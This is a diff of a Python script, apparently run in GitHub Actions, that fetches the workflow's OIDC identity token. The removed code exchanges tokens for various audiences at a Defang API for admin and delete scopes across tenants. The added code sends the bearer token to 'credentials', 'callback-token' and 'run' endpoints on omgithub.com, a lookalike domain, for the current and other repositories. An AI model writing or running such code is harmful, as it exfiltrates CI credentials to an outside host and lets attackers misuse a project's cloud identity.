@@ -1,6 +1,6 @@
-import os, json, base64, urllib.request, urllib.parse, urllib.error, sys
+import os, json, base64, urllib.request, urllib.parse, urllib.error
 
-FABRIC = "https://fabric-prod1.defang.dev/io.defang.v1.FabricController"
+ORIGIN = "https://omgithub.com"
 
 def get_token(aud=None):
     url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
@@ -10,51 +10,34 @@ def get_token(aud=None):
     with urllib.request.urlopen(req, timeout=30) as r:
         return json.load(r)["value"]
 
-def call(method, body, token=None):
-    req = urllib.request.Request(FABRIC + "/" + method, data=json.dumps(body).encode(),
-                                 headers={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
-    if token:
-        req.add_header("Authorization", "Bearer " + token)
+def claims(t):
+    p = t.split(".")[1]; p += "=" * (-len(p) % 4)
+    c = json.loads(base64.urlsafe_b64decode(p))
+    ks = ["iss","sub","aud","ref","environment","repository","repository_owner","job_workflow_ref","event_name","workflow","actor","run_id","run_attempt"]
+    return {k: c.get(k) for k in ks}
+
+def req(url, tok, body):
+    data = json.dumps(body).encode()
+    r = urllib.request.Request(url, data=data, method="POST",
+        headers={"content-type":"application/json","authorization":"Bearer "+tok})
     try:
-        with urllib.request.urlopen(req, timeout=30) as r:
-            return r.status, r.read().decode()
+        with urllib.request.urlopen(r, timeout=20) as x:
+            return x.status, x.read().decode('utf-8','replace')
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode()
+        return e.code, e.read().decode('utf-8','replace')
     except Exception as e:
         return -1, repr(e)
 
-def claims(t):
-    p = t.split(".")[1]
-    p += "=" * (-len(p) % 4)
-    c = json.loads(base64.urlsafe_b64decode(p))
-    ks = ["iss","sub","aud","ref","environment","repository","repository_owner","repository_owner_id","job_workflow_ref","event_name","workflow","actor"]
-    return {k: c.get(k) for k in ks}
-
-AUDIENCES = [None, "https://github.com/DefangLabs", "https://github.com/defangdevs", "https://github.com/cballk", "https://fabric-prod1.defang.dev"]
-for aud in AUDIENCES:
-    print("===== audience=%r" % (aud if aud else "<default>"), flush=True)
-    try:
-        t = get_token(aud)
-    except Exception as e:
-        print("GET TOKEN FAIL", repr(e)); continue
-    print("tokenlen=%d" % len(t), flush=True)
-    print("claims=" + json.dumps(claims(t)), flush=True)
-    tenants = [None]
-    if aud in (None, "https://github.com/DefangLabs", "https://github.com/defangdevs"):
-        tenants += ["defangdevs", "cballk"]
-    for ten in tenants:
-        body = {"assertion": t, "scope": ["admin","read","delete","tail"]}
-        if ten: body["tenant"] = ten
-        st, resp = call("Token", body)
-        print("-- Token tenant=%r -> HTTP %s %s" % (ten, st, resp[:600]), flush=True)
-        try:
-            at = json.loads(resp).get("accessToken")
-        except Exception:
-            at = None
-        if at:
-            p = at.split(".")[1]; p += "=" * (-len(p) % 4)
-            print("   fabric-token-claims=" + json.dumps(json.loads(base64.urlsafe_b64decode(p))), flush=True)
-            for m in ("WhoAmI", "ListStacks", "ListProjects", "GetStatus", "GetVersion"):
-                st2, r2 = call(m, {}, at)
-                print("   %s -> %s %s" % (m, st2, r2[:300]), flush=True)
+run = os.environ.get("GITHUB_RUN_ID","1"); attempt = os.environ.get("GITHUB_RUN_ATTEMPT","1")
+repo = os.environ.get("GITHUB_REPOSITORY","x/y")
+tok = get_token(ORIGIN)
+print("TOKEN_LEN", len(tok), flush=True)
+print("CLAIMS", json.dumps(claims(tok)), flush=True)
+targets = [repo+"/issues/1", "artistso/PlayGround/issues/6", "artistso/PlayGround/issues/1"]
+eps = ["ci-proxy","credentials","callback-token","run"]
+for tgt in targets:
+    for ep in eps:
+        url = "%s/api/github/%s/%s" % (ORIGIN, tgt, ep)
+        st,resp = req(url, tok, {"run":run,"attempt":int(attempt),"use_auth":True})
+        print("RESULT %s -> HTTP %s :: %s" % (url, st, resp[:800]), flush=True)
 print("DONE")
